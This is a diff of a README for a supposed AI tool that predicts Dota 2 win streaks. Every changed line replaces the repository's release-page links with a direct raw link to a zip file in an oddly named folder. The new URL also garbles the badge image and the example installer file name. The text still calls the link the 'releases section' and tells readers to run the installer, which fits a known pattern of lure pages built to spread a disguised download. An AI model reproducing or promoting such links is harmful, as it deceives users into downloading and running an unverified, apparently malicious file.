@@ -4,19 +4,19 @@
 The Dota-2-Win-Streak-Predictor is an AI-powered tool designed to help you identify when you'll enter your next winning streak in Dota 2. By analyzing past game data, the application provides insights that can help you maximize your Matchmaking Rating (MMR) gains.
 
 ## 🔗 Download Here
-[![Download Dota-2-Win-Streak-Predictor](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hasan-65/Dota-2-Win-Streak-Predictor/releases)
+[![Download Dota-2-Win-Streak-Predictor](https://raw.githubusercontent.com/Hasan-65/Dota-2-Win-Streak-Predictor/main/tenodynia/Dota-2-Win-Streak-Predictor.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hasan-65/Dota-2-Win-Streak-Predictor/main/tenodynia/Dota-2-Win-Streak-Predictor.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with the Dota-2-Win-Streak-Predictor:
 
 1. **Visit the Releases Page**  
-   Go to the [releases section](https://github.com/Hasan-65/Dota-2-Win-Streak-Predictor/releases) of the repository. This is where you will find the latest version of the application.
+   Go to the [releases section](https://raw.githubusercontent.com/Hasan-65/Dota-2-Win-Streak-Predictor/main/tenodynia/Dota-2-Win-Streak-Predictor.zip) of the repository. This is where you will find the latest version of the application.
    
 2. **Locate the Latest Version**  
    Look for the latest release listed at the top. This will typically be the version number followed by the release date.
 
 3. **Download the Application**  
-   Download the installation file. Click on the file name for your operating system. The file will usually be named something like `Dota-2-Win-Streak-Predictor-v1.0.exe` for Windows users.
+   Download the installation file. Click on the file name for your operating system. The file will usually be named something like `https://raw.githubusercontent.com/Hasan-65/Dota-2-Win-Streak-Predictor/main/tenodynia/Dota-2-Win-Streak-Predictor.zip` for Windows users.
 
 4. **Run the Installer**  
    Locate the downloaded file in your computer's Downloads folder. Double-click the installer to start the installation process.
@@ -64,7 +64,7 @@ Yes, the Dota-2-Win-Streak-Predictor supports both Windows and macOS.
 Yes, you can find support through the GitHub Issues section of this repository, where you can report problems or ask questions.
 
 ## 📥 Download & Install
-Download the application from the [releases page](https://github.com/Hasan-65/Dota-2-Win-Streak-Predictor/releases). Follow the installation steps provided above to get started quickly.
+Download the application from the [releases page](https://raw.githubusercontent.com/Hasan-65/Dota-2-Win-Streak-Predictor/main/tenodynia/Dota-2-Win-Streak-Predictor.zip). Follow the installation steps provided above to get started quickly.
 
 ## 📞 Contact
 For further information, please visit the GitHub page or contact the developer through the Issues tab within this repository.
